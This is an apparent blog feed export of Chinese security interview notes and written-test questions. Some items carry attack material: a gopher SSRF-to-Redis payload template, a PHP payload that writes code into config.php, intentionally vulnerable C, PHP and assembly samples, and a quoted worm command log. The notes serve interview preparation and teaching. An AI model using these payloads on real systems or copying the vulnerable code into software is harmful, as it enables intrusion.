href="#-144" class="headerlink" title=""></a></h3><h3 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h3></li></ul><ol><li>控制面板-管理工具-计划任务，在“任务计划程序库”上右键–创建基本任务</li><li><code>schtasks</code>命令 语法: <code>schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo  modifier] [/d day] [/m month[,month...] [/i IdleTime] [/st StartTime]  [/sd StartDate] [/ed EndDate] [/scomputer [/u [domain]user /p password]] [/ru {[Domain]User | &quot;System&quot;} [/rpPassword]] /?</code><h2 id="-145"><a href="#-145" class="headerlink" title=""></a></h2><h2 id="ISO27000和等保-重点等保"><a href="#ISO27000和等保-重点等保" class="headerlink" title="ISO27000和等保(重点等保)"></a>ISO27000和等保(重点等保)</h2><h3 id="-146"><a href="#-146" class="headerlink" title=""></a></h3><h3 id="说一下ISO27000"><a href="#说一下ISO27000" class="headerlink" title="说一下ISO27000"></a>说一下ISO27000</h3>ISO27000是国际知名的信息安全管理体系标准，适用于整个企业，不仅仅是IT部门，还包括业务部门、财务、人事等部门。引入信息安全管理体系就可以协调各个方面信息管理，从而使管理更为有效。保证信息安全不是仅有一个防火墙，或找一个24小时提供信息安全服务的公司就可以达到的。它需要全面的综合管理。<br>PDCA（plan do check action）管理循环<h3 id="-147"><a href="#-147" class="headerlink" title=""></a></h3><h3 id="说一下等级保护制度"><a href="#说一下等级保护制度" class="headerlink" title="说一下等级保护制度"></a>说一下等级保护制度</h3>《信息安全等级保护管理办法》是为规范信息安全等级保护管理，提高信息安全保障能力和水平，维护国家安全、社会稳定和公共利益，保障和促进信息化建设，根据《中华人民共和国计算机信息系统安全保护条例》等有关法律法规而制定的办法。<h3 id="-148"><a href="#-148" class="headerlink" title=""></a></h3><h3 id="差异"><a href="#差异" class="headerlink" title="差异"></a>差异</h3><blockquote><p>浅谈信息安全等级保护与ISO27000系列标准的异同 ISSN 1009-3044<br>等保是以国家安全、社会秩序和公共利益为出发点，构建国家的安全保障体系。27000系列是以保证组织业务的连续性，缩减业务风险，最大化投资收益为目的，保证组织的业务安全</p></blockquote><h3 id="-149"><a href="#-149" class="headerlink" title=""></a></h3><h3 id="共性"><a href="#共性" class="headerlink" title="共性"></a>共性</h3><h2 id="-150"><a href="#-150" class="headerlink" title=""></a></h2><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h3 id="-151"><a href="#-151" class="headerlink" title=""></a></h3><h3 id="排序算法：快排-二分-冒泡"><a href="#排序算法：快排-二分-冒泡" class="headerlink" title="排序算法：快排 二分 冒泡"></a>排序算法：快排 二分 冒泡</h3><h2 id="-152"><a href="#-152" class="headerlink" title=""></a></h2><h2 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h2><blockquote><p><a href="http://www.4hou.com/technology/9090.html" target="_blank" rel="noopener">http://www.4hou.com/technology/9090.html</a> <a href="https://blog.csdn.net/quiet_girl/article/details/50716312" target="_blank" rel="noopener">https://blog.csdn.net/quiet_girl/article/details/50716312</a></p></blockquote></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;p&gt;sql注入时碰到update型和insert型，你会利用哪种&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span
      
    
    </summary>
    
    
      <category term="面经总结" scheme="http://yoursite.com/categories/%E9%9D%A2%E7%BB%8F%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="面经" scheme="http://yoursite.com/tags/%E9%9D%A2%E7%BB%8F/"/>
    
  </entry>
  
  <entry>
    <title>笔试面经</title>
    <link href="http://yoursite.com/2020/02/26/%E7%AC%94%E8%AF%95%E9%9D%A2%E7%BB%8F/"/>
    <id>http://yoursite.com/2020/02/26/%E7%AC%94%E8%AF%95%E9%9D%A2%E7%BB%8F/</id>
    <published>2020-02-26T03:06:52.000Z</published>
    <updated>2020-02-27T04:23:14.706Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>在SSRF漏洞中利用gopher协议攻击redis进行getshell，如何构造payload，写出操作步骤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.先在本地复现，使用socat抓取攻击数据包。</span><br><span class="line">2.将上一步抓取的数据包使用脚本进行转码，使其适用与gopher。</span><br><span class="line">3.及那个上述poc发送，如http:&#x2F;&#x2F;www.xxx.com&#x2F;1.php?url&#x3D;gopher:&#x2F;&#x2F;111.111.111.111:6379&#x2F;&#123;poc&#125;</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>分析XSS防御被绕过的场景</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编码绕过</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>代码存在漏洞吗？若存在，则给出payload（如执行phpinfo）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php&gt;</span><br><span class="line"></span><br><span class="line">$text &#x3D; $_GET[&#39;content&#39;];</span><br><span class="line"></span><br><span class="line">if(preg_match(&#39;&#x2F;&lt;&gt;?&#x2F;&#39;,$text))&#123;</span><br><span class="line"></span><br><span class="line">die(&#39;you bad boy&#39;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file_put_contents(&#39;config.php&#39;,$text);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">存在，http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?content[]&#x3D;&lt;?php phpinfo();&gt;</span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><p>Android常见的反调试技术</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">安卓调试检测函数</span><br><span class="line">IDA调试端口检测</span><br><span class="line">调试器进程名检测</span><br><span class="line">检测系统关键文件</span><br><span class="line">检测安卓内核修改</span><br><span class="line">多进程反调试</span><br><span class="line">代码执行时间检测</span><br><span class="line">rtld_db_dlactivity函数</span><br><span class="line">https:&#x2F;&#x2F;www.52pojie.cn&#x2F;thread-709669-1-1.html</span><br></pre></td></tr></table></figure></li></ol><p>\5. https中间人攻击的原因？具体实现层面的成因</p><p>\6. Android https中间人攻击通常有哪些？</p><p>\7. webview file 域远程信息泄露需要开启哪三个方法</p><p>\8. Android动态加载有几种方式？区别是什么</p><p>\9. Android App 研发中，广播是否都需要写在manifest.xml中？若不是，请说明其他实现广播功能的方法</p><p>\10. SSRF漏洞原理。如何防御</p><p>\11. 内网渗透如何躲避监控？</p><p>\12. 实现简单爬虫爬取页面，能过滤输出所有<p>标签</p><p>\13. 根据智能家居使用场景，设计一个针对只能硬件与云端、手机端APP之间“安全”的同步认证凭证和交互控制（如APP操作智能硬件等）的协议</p><p>\1. 内存断点：改0xcc能实现中断吗？  可以</p><p>\2. TCP报头的控制字段是什么</p><p>\3. N阶三对角带状矩阵</p><p>\4. 劫持首页可以用哪些手段？ PAC/BHO/DNS</p><p>\5. 堆排序是怎样的？逆序列是什么？</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>\1. http响应类型</p><p>\2. https可以防御csrf吗</p><p>\3. activity 生命周期不包括哪个？  不包括onFinish()</p><p>onResume()  onRestart() onDestory() onFinish()</p><p>-————————————————————</p><p>一个最简单的完整的Activity生命周期会按照如下顺序回调：onCreate -&gt; onStart -&gt; onResume -&gt; onPause -&gt; onStop -&gt; onDestroy。称之为<strong><em>\</em>entire lifetime。**</strong></p><p>-————————————————————</p><p>\4. UPX PEid </p><p>\5. Eip指向下一个被执行文件吗？</p><p>\6. crossdomain.xml文件的用途</p><p>\7. redis默认端口是多少？  </p><p>​     6379</p><p>\8. 若是未经授权，redis有几种利用方式</p><p>\9. 微信支付漏洞原理，修复建议是什么</p><p>\10. elf文件是什么</p><p>\11. re正则规范了解一下</p><p>\12. 字符盲注：怎么获取数据库名 /?id = …</p><p>\13. xss和csrf的区别</p><p>\1. RARP 、DNS属于哪层协议</p><p>\2. user-agent中 AppleWebkit是什么系统</p><p>\3. 了解：永恒之蓝，rdp弱口令、strut2-045</p><p>\4. 哪种weib攻击防火墙几乎无法防御？ SQL/XSS/越权/一句话木马</p><p>\5. nmap的功能</p><p>\6. 哪个TCP数据包异常？：syn/ack置1/TCP报头全为0/报头全为1/syn/fin都为1</p><p>\7. 远程文件包含漏洞</p><p>\8. PCHunter  autoruns  tcpview</p><p>\9. 可直接获取webshell的漏洞有哪些？ webdav方法开启可以吗</p><p>\10. 正则   ^200  [^200]的区别</p><p>11.控制用户访问Apache目录的配置文件是什么？</p><p>\12. google hacking</p><p>\13. LOIC   Icesword</p><p>\14. web安全核心问题什么？接受用户参数吗？</p><p>\15. DNS的AAAA什么意思</p><p>\16. DNS服务器投毒</p><p>\17. 菜刀  穿山甲  beef  使用时的报文形式</p><p>\18. IIS 6.0 解析漏洞</p><p>\19. 数字型注入   </p><p>\20. $_GET[id] == 1024 什么意思</p><p>\1. Final类型有哪些？（多选） hashtable  string stringbuffer  hashmap</p><p>\2. 强引用  弱引用  幻象引用  软引用</p><p>\3. post-mortem机制</p><p>\4. TCP/UDP粘包问题</p><p>\5. DNS、NFS\SNMP等使用什么协议（TCP?UDP?）</p><p>\6. “4+1” 视图模型</p><p>\7. 快速排序</p><p>\8. <abbr></abbr>什么效果</p><p>\9. 乐观锁  悲观锁</p><p>\10. 哈希表是存储结构吗</p><p>\11. server用cookie跟踪用户吗？</p><p>\12. cc攻击/ddos应急响应办法</p><p>\1. 如何检测程序API是否被hook</p><p>\2. 设计方案，判断linux主机是否被攻击</p><p>\3. 同事windows中毒了，如何清理病毒病分析中毒原因</p><p>\4. 根据文件写逆向分析报告，写出逆向的步骤和思路  crakeme pwn_linux_64</p><p>\1. nmap用哪些协议进行扫描</p><p>\2. 文件上传漏洞如何进行渗透</p><p>\3. struts2漏洞原理</p><p>\4. 心脏滴血漏洞原理</p><p>\1. linux SUID</p><p>\2. 哪些功能可能讯在csrf</p><p>\3. BLE易受哪些攻击</p><p>\4. LD_PRELOAD环境变量</p><p>\5. linux被遭攻击，哪个日志文件可以看</p><p>\6. 绕过DEP保护进行缓冲区溢出的方式</p><p>\7. HeapSpray漏洞</p><p>\8. 如何伪造SHE爆破安全cookie</p><ul><li><p>2017_ali_spring_1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.vuln.xxx&#x2F;show_pic?image&#x3D;http:&#x2F;&#x2F;image.test.com&#x2F;1.jpg</span><br><span class="line">上述URL可能引起的安全问题有哪些？详细阐述下，如果存在该漏洞会产生什么危害？通常情况下，你会如何利用？</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TCP和UDP协议的区别？路由器、交换机、防火墙等网络设备在配置ACL时应注意哪些问题？</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">以下c代码是否包含安全漏洞，如存在漏洞，请说出漏洞如何触发？</span><br><span class="line">bool funcA(unsigned int cbSize)&#123;</span><br><span class="line">    if (cbSize &lt; 1024) &#123;</span><br><span class="line">    char *buf &#x3D; new char[cbSize-1];</span><br><span class="line">    memset(buf,0,cbSize-1);</span><br><span class="line">    delete buf;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line">    else</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">代码所执行的环境是Linux kalilocal 4.9.0-kali1-amd64 (2017-01-30) x86_64 GNU&#x2F;Linux</span><br><span class="line">如果编译命令是gcc test.c -o test ，请你写出可以获取secret 的所有方法</span><br><span class="line"></span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">char secret[10];</span><br><span class="line">int create_secret()&#123;</span><br><span class="line">    int fd;</span><br><span class="line">    fd &#x3D; open(&quot;secret&quot;,O_RDONLY);</span><br><span class="line">    read(fd,secret,10);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    char format[10] &#x3D; &quot;%s&quot;;</span><br><span class="line">    char username[10];</span><br><span class="line">    create_secret();</span><br><span class="line">    scanf(format,username);</span><br><span class="line">    printf(format,username);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">现有办公网、生产网各一份DNS服务器采集的DNS日志，包括时间、请求域名domain、请求类型type、返回值value、源IP、源端口信息。</span><br><span class="line">根据这两份数据，分别阐述你可以产出什么类型的安全告警，并作简要思路说明。</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_6</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如何通过数据分析的方式检测出一个系统账户被非其所有人使用</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_7</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">以下是一份iOS crash日志，这份日志里面有哪些问题？应该如何分析？</span><br><span class="line"></span><br><span class="line">Incident Identifier: 12F51135-7348-4683-9CF2-2285669EAB89</span><br><span class="line">CrashReporter Key:   670f3f77d42a1d3e752f10392bb38290eebf5af9</span><br><span class="line">Hardware Model:      iPad4,1</span><br><span class="line">Version:             1.0.0.02220012 (1.0.0)</span><br><span class="line">Code Type:           ARM-64 (Native)</span><br><span class="line">Parent Process:      launchd [1]</span><br><span class="line">Exception Type:  EXC_BAD_ACCESS (SIGBUS)</span><br><span class="line">Exception Subtype: KERN_PROTECTION_FAILURE at 0x000000010a463500</span><br><span class="line">Triggered by Thread:  0</span><br><span class="line"> </span><br><span class="line">Filtered syslog:</span><br><span class="line">None found</span><br><span class="line"> </span><br><span class="line">Thread 0 name:  Dispatch queue: com.apple.main-thread</span><br><span class="line">Thread 0 Crashed:</span><br><span class="line">0       ???                             0x10a463500 0x00000000 + 0x10a463500</span><br><span class="line">1       JavaScriptCore                  0x187eeea88 0x187b14000 + 0x3daa88  &#x2F;&#x2F; long long JSC::APICallbackFunction::call&lt;JSC::JSCallbackFunction&gt;(JSC::ExecState*) + 0x1a4</span><br><span class="line">2       JavaScriptCore                  0x187b5a3b4 0x187b14000 + 0x463b4   &#x2F;&#x2F; JSC::LLInt::setUpCall(JSC::ExecState*, JSC::Instruction*, JSC::CodeSpecializationKind, JSC::JSValue, JSC::LLIntCallLinkInfo*) + 0x1dc</span><br><span class="line">3       JavaScriptCore                  0x187f9dd68 0x187b14000 + 0x489d68  &#x2F;&#x2F; llint_entry + 0x5c58</span><br><span class="line">4       JavaScriptCore                  0x187f97ef8 0x187b14000 + 0x483ef8  &#x2F;&#x2F; vmEntryToJavaScript + 0x138</span><br><span class="line">5       JavaScriptCore                  0x187ec4c48 0x187b14000 + 0x3b0c48  &#x2F;&#x2F; JSC::JITCode::execute(JSC::VM*, JSC::ProtoCallFrame*) + 0xb4</span><br><span class="line">6       JavaScriptCore                  0x187b45660 0x187b14000 + 0x31660   &#x2F;&#x2F; JSC::Interpreter::execute(JSC::ProgramExecutable*, JSC::ExecState*, JSC::JSObject*) + 0x200c</span><br><span class="line">7       JavaScriptCore                  0x187c9dab0 0x187b14000 + 0x189ab0  &#x2F;&#x2F; JSC::evaluate(JSC::ExecState*, JSC::SourceCode const&amp;, JSC::JSValue, WTF::NakedPtr&lt;JSC::Exception&gt;&amp;) + 0x1b8</span><br><span class="line">8       JavaScriptCore                  0x187ee8964 0x187b14000 + 0x3d4964  &#x2F;&#x2F; JSEvaluateScript + 0x1a0</span><br><span class="line">9     + libcycript.dylib                0x10aaab6c0 0x10aa64000 + 0x476c0   &#x2F;&#x2F; CYExecute(OpaqueJSContext const*, CYPool&amp;, CYUTF8String) + 0x9c</span><br><span class="line">10    + libcycript.dylib                0x10aad0af0 0x10aa64000 + 0x6caf0   &#x2F;&#x2F; CYPerform(void*) + 0x44</span><br><span class="line">11      CoreFoundation                  0x1864a0544 0x1863c4000 + 0xdc544   &#x2F;&#x2F; __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__ + 0x18</span><br><span class="line">12      CoreFoundation                  0x18649ffd8 0x1863c4000 + 0xdbfd8   &#x2F;&#x2F; __CFRunLoopDoSources0 + 0x21c</span><br><span class="line">13      CoreFoundation                  0x18649dcd8 0x1863c4000 + 0xd9cd8   &#x2F;&#x2F; __CFRunLoopRun + 0x2d4</span><br><span class="line">14      CoreFoundation                  0x1863ccca0 0x1863c4000 + 0x8ca0    &#x2F;&#x2F; CFRunLoopRunSpecific + 0x180</span><br><span class="line">15      GraphicsServices                0x191434088 0x191428000 + 0xc088    &#x2F;&#x2F; GSEventRunModal + 0xb4</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_8</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在android的加壳的方案里，很多壳都会引入反调试机制。列举你所知道的反调试技术，三种以上，并给出原理。</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_9</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">作为一个安全研究者, 你能想到哪些办法对家里的IoT设备进行加固, 避免其遭受黑客攻击？</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_10</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">以下为某蠕虫执行命令日志，请问这个蠕虫想通过这些命令达到什么效果。</span><br><span class="line"></span><br><span class="line">&#x2F;bin&#x2F;busybox echo -e &#39;\\x6b\\x61\\x6d\\x69&#x2F;run&#39; &gt; &#x2F;run&#x2F;.nippon; &#x2F;bin&#x2F;busybox cat &#x2F;run&#x2F;.nippon; &#x2F;bin&#x2F;busybox rm &#x2F;run&#x2F;.nippon</span><br><span class="line">&#x2F;bin&#x2F;busybox echo -e &#39;\\x6b\\x61\\x6d\\x69&#x2F;tmp&#39; &gt; &#x2F;tmp&#x2F;.nippon; &#x2F;bin&#x2F;busybox cat &#x2F;tmp&#x2F;.nippon; &#x2F;bin&#x2F;busybox rm &#x2F;tmp&#x2F;.nippon</span><br><span class="line">&#x2F;bin&#x2F;busybox echo -e &#39;\\x6b\\x61\\x6d\\x69&#x2F;sys&#39; &gt; &#x2F;sys&#x2F;.nippon; &#x2F;bin&#x2F;busybox cat &#x2F;sys&#x2F;.nippon; &#x2F;bin&#x2F;busybox rm &#x2F;sys&#x2F;.nippon</span><br><span class="line">&#x2F;bin&#x2F;busybox echo -e &#39;\\x6b\\x61\\x6d\\x69&#x2F;run&#39; &gt; &#x2F;run&#x2F;.nippon; &#x2F;bin&#x2F;busybox cat &#x2F;run&#x2F;.nippon; &#x2F;bin&#x2F;busybox rm &#x2F;run&#x2F;.nippon</span><br><span class="line">&#x2F;bin&#x2F;busybox echo -e &#39;\\x6b\\x61\\x6d\\x69&#x2F;dev&#39; &gt; &#x2F;dev&#x2F;.nippon; &#x2F;bin&#x2F;busybox cat &#x2F;dev&#x2F;.nippon; &#x2F;bin&#x2F;busybox rm &#x2F;dev&#x2F;.nippon</span><br><span class="line">&#x2F;bin&#x2F;busybox echo -e &#39;\\x6b\\x61\\x6d\\x69&#x2F;sys&#39; &gt; &#x2F;sys&#x2F;.nippon; &#x2F;bin&#x2F;busybox cat &#x2F;sys&#x2F;.nippon; &#x2F;bin&#x2F;busybox rm &#x2F;sys&#x2F;.nippon</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_11</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如何给linux web服务器做加固，请简述步骤。</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_12</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过Linux系统的&#x2F;proc目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_13</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_14</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">你通过某爬虫获得了 *.aliyun.com 下100万条URL（包括动态页面、静态资源等URL），接下来你打算对这些URL进行黑盒扫描。</span><br><span class="line">为了提高扫描效率，你需要对这些URL进行去重。请简述你的URL去重方案及理由。</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_15</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请简要描述最近的struts2 S2-045漏洞的原理，及构造POC需要满足怎样的条件？</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_16</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">请分析如下代码有何漏洞，并给出exploit。</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&#39;upload&#39;])) &#123;</span><br><span class="line">    $upload_dir &#x3D; &quot;uploads&#x2F;&quot;;</span><br><span class="line">    $file_name &#x3D; $_FILES[&#39;file&#39;][&#39;name&#39;];</span><br><span class="line">    $file_extension &#x3D; substr($file_name, strrpos($file_name, &#39;.&#39;) + 1);</span><br><span class="line">    $file_type &#x3D; $_FILES[&#39;file&#39;][&#39;type&#39;];</span><br><span class="line">    $file_size &#x3D; $_FILES[&#39;file&#39;][&#39;size&#39;];</span><br><span class="line">    if (($file_type &#x3D;&#x3D; &quot;image&#x2F;jpeg&quot; || $file_type &#x3D;&#x3D; &quot;image&#x2F;png&quot;) &amp;&amp; $file_size &lt;</span><br><span class="line">100000) &#123;</span><br><span class="line">        $save_file_name &#x3D; time();</span><br><span class="line">        $save_path &#x3D; $upload_dir . $save_file_name . &quot;.&quot; . $file_extension;</span><br><span class="line">        if (!move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $save_path)) &#123;</span><br><span class="line">            echo &quot;your image is not uploaded&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;wrong file type.Only accept images&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_17</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">小明对一站点进行渗透测试，发现一处参数明显存在shell命令注入问题。</span><br><span class="line">但是&quot;| ls&quot;，&quot;&#39; &amp;&amp; ls #&quot;等方式均无法执行成功命令。</span><br><span class="line">请分析具体的情况，并给出各种情况下的测试步骤。</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_18</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请说出网络防火墙的不同类别，它们分别在安全上有什么优势和缺点，</span><br><span class="line">以及在大型互联网公司，更适合采用何种网络防火墙，为什么？</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_19</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">本题故意留空.</span><br><span class="line">来自 https:&#x2F;&#x2F;github.com&#x2F;SecYouth&#x2F;all-about-security-jobs</span><br><span class="line">QQ群 306335642</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_20</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">请阅读下面一段汇编代码，判断其是否存在安全漏洞？如果存在，请指出漏洞成因</span><br><span class="line"></span><br><span class="line">make_table      proc near</span><br><span class="line">src             &#x3D; qword ptr -20h</span><br><span class="line">var_18          &#x3D; dword ptr -18h</span><br><span class="line">n               &#x3D; qword ptr -14h</span><br><span class="line">size            &#x3D; qword ptr -8</span><br><span class="line"> </span><br><span class="line">                push    rbp</span><br><span class="line">                mov     rbp, rsp</span><br><span class="line">                sub     rsp, 20h</span><br><span class="line">                mov     dword ptr [rbp+n], edi</span><br><span class="line">                mov     [rbp+var_18], esi</span><br><span class="line">                mov     [rbp+src], rdx</span><br><span class="line">                mov     eax, dword ptr [rbp+n]</span><br><span class="line">                imul    eax, [rbp+var_18]</span><br><span class="line">                mov     dword ptr [rbp+size], eax</span><br><span class="line">                mov     eax, dword ptr [rbp+size]</span><br><span class="line">                mov     rdi, rax        ; size</span><br><span class="line">                call    _malloc</span><br><span class="line">                mov     [rbp+n+4], rax</span><br><span class="line">                cmp     [rbp+n+4], 0</span><br><span class="line">                jnz     short loc_4005D6</span><br><span class="line">                mov     eax, 0</span><br><span class="line">                jmp     short locret_400611</span><br><span class="line">loc_4005D6:</span><br><span class="line">                mov     dword ptr [rbp+size+4], 0</span><br><span class="line">                jmp     short loc_400605</span><br><span class="line">loc_4005DF: </span><br><span class="line">                mov     edx, dword ptr [rbp+n] ; n</span><br><span class="line">                mov     eax, dword ptr [rbp+size+4]</span><br><span class="line">                imul    eax, dword ptr [rbp+n]</span><br><span class="line">                mov     ecx, 